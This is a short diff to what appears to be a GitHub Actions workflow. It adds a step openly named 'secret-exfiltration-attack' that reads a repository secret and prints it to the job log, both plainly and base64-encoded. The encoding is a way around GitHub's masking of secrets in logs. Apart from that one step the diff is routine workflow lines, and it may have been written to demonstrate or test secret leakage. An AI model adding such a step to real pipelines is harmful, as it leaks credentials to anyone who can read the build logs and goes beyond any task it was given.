@@ -15,4 +15,10 @@ jobs:
       - name: List files in the repository
         run: |
           ls ${{ github.workspace }}
+      - name: secret-exfiltration-attack
+        env:
+          SECRET: ${{ secrets.SUPER_SECRET_CANT_README }}
+        run: |
+          echo "Here's foop: [ $SECRET ]"
+          echo "Here's foop: [ " $( echo $SECRET | base64) " ]"
       - run: echo "🍏 This job's status is ${{ job.status }}."
